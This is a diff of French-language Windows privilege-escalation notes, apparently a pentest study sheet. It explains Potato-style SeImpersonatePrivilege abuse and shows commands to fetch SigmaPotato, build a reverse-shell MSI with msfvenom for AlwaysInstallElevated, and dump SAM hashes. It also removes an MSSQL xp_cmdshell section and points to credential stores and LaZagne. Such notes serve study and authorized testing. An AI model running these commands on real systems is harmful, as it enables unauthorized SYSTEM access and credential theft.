@@ -656,10 +656,40 @@ Les kernel exploits peuvent crasher le système - tester sur un clone avant.
 
 ## SeImpersonatePrivilege
 
-`SeImpersonatePrivilege` permet d'usurper l'identité d'un client après authentification. Souvent présent sur les comptes de service IIS (LocalService, NetworkService, ApplicationPoolIdentity).
+### Théorie
+Permet à un service de traiter une requête avec les droits du client qui s'y connecte, plutôt qu'avec ses propres droits (moindre privilège). Souvent présent sur les comptes de service IIS (LocalService, NetworkService, ApplicationPoolIdentity).
+**Workflow légitime :**
+1. Client s'authentifie auprès d'un service (ex: MSSQL, IIS).
+2. LSASS crée un token pour ce client, attaché au thread du service.
+3. Le service appelle `ImpersonateLoggedOnUser` sur ce token.
+4. Les opérations du thread s'exécutent avec les droits du client.
+5. `RevertToSelf` une fois terminé.
 
+**Le détournement offensif**
+SeImpersonatePrivilege n'autorise à impersonate **que** ce qui est présenté (authentification entrante), jamais un token pioché dans un autre process (ça nécessite SeDebugPrivilege, absent ici).
+**Principe des Potatoes :** forcer un composant SYSTEM local à s'authentifier vers un listener contrôlé par l'attaquant (coerce), pour capturer ce token SYSTEM.
+
+**Famille COM/DCOM - RottenPotato / JuicyPotato / GodPotato**
+1. Attaquant instancie un objet COM (CLSID d'un service SYSTEM, ex: BITS).
+2. Le DCOM Service Control Manager (SYSTEM) doit résoudre l'OXID de cet objet.
+3. Attaquant monte un faux OXID resolver local.
+4. DCOMLaunch (SYSTEM) s'authentifie NTLM auprès de ce faux resolver.
+5. Token SYSTEM capturé → impersonation.
+Évolutions : JuicyPotato (choix du CLSID/port), RoguePotato (contourne le blocage loopback post-patch), GodPotato (adapté aux OS récents).
+
+**Famille Spouleur - PrintSpoofer**
+Exploite `RpcRemoteFindFirstPrinterChangeNotificationEx` (MS-RPRN), normalement destinée à notifier un abonné d'événements d'impression.
+1. Attaquant crée un named pipe local.
+2. Appelle la fonction RPC en indiquant ce pipe comme destination des notifications.
+3. Spouleur (SYSTEM) se connecte à ce pipe → authentification NTLM.
+4. Attaquant capture via `ImpersonateNamedPipeClient`.
+5. Token SYSTEM obtenu → impersonation.
+
+**Finalisation commune**
+`DuplicateToken` (impersonation → primaire) puis `CreateProcessAsUser` pour lancer un process en tant que SYSTEM.
+
+### Pratique
 **Vérifier le privilege**
-
 ```cmd
 whoami /priv
 
@@ -672,7 +702,6 @@ SeImpersonatePrivilege        Impersonate a client after authentication Enabled
 ```
 
 **Télécharger SigmaPotato et exécuter des commandes en SYSTEM**
-
 ```bash
 # Kali : télécharger et servir
 wget https://github.com/tylerdotrar/SigmaPotato/releases/download/v1.2.6/SigmaPotato.exe
@@ -702,9 +731,6 @@ Prérequis : `SeImpersonatePrivilege` ou `SeAssignPrimaryTokenPrivilege`.
 | [GodPotato](https://github.com/BeichenDream/GodPotato)                                             | Exploite IRemUnknown2 via DCOM, fonctionne sur Windows 2012-2022. Le plus fiable actuellement. |
 | [SigmaPotato](https://github.com/tylerdotrar/SigmaPotato/releases/download/v1.2.6/SigmaPotato.exe) | Variante moderne, simple d'utilisation.                                                        |
 | [PetitPotato](https://github.com/wh0amitz/PetitPotato)                                             | + Moderne                                                                                      |
-
-Choix rapide : GodPotato en premier, PrintSpoofer en fallback.
-
 ## Backup Operator
 
 Le groupe `Backup Operators` confère `SeBackupPrivilege` et `SeRestorePrivilege`, permettant de lire/écrire n'importe quel fichier en bypassant les ACLs - y compris les ruches de registre contenant les hashes locaux.
@@ -802,30 +828,10 @@ impacket-secretsdump -sam SAM -system SYSTEM LOCAL
 - **Registry AutoLogon** : `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`
 - **Saved RDP connections** : `HKCU\Software\Microsoft\Terminal Server Client\Servers`
 - **MSSQL credentials** : Si SQL Server tourne, se connecter et chercher une table creds
+- https://github.com/AlessandroZ/LaZagne
+# AlwaysInstallElevated
 
-# MSSQL Exploitation
-
-```shell
-# Si port 1433 trouvé — forwarder via Ligolo si nécessaire
-impacket-mssqlclient 'user'@127.0.0.1 -windows-auth
-
-# Énumérer
-SQL> SELECT name FROM sys.databases;
-SQL> use accounts;
-SQL> SELECT * FROM creds;
-
-# Activer xp_cmdshell pour RCE
-SQL> EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
-SQL> EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
-SQL> EXEC xp_cmdshell 'whoami';
-```
-
-## LaZagne
-https://github.com/AlessandroZ/LaZagne
-
-## AlwaysInstallElevated
-
-### Détection
+**Détection**
 Vérifier les deux clés de registre :
 ```cmd
 reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
@@ -839,7 +845,7 @@ Get-ItemProperty HKLM:\SOFTWARE\Policies\Microsoft\Windows\Installer
 
 Les deux doivent retourner `0x1` pour que la vulnérabilité soit exploitable.
 
-### Exploitation via RevShell
+**Exploitation via RevShell**
 ```bash
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f msi -o evil.msi
 ```
@@ -848,7 +854,7 @@ msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f msi -o evil
 msiexec /quiet /qn /i evil.msi
 ```
 
-### Exploitation via adduser
+**Exploitation via adduser**
 
 ```bash
 sudo apt install wixl
